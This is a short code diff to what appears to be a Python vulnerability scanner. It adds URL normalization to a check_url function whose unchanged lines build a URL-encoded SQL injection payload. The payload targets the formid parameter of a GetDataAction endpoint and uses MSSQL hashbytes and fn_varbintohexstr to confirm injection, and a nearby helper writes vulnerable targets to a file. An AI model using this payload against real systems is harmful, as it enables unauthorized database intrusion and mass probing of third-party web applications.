@@ -33,6 +33,8 @@ def wirte_targets(vurl, filename):
 		f.write(vurl + "\n")
 
 def check_url(url):
+	url=parse.urlparse(url)
+	url='{}://{}'.format(url[0],url[1])
 	vulnurl=url + "/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a"
 	headers = {
 		'User-Agent': get_ua(),
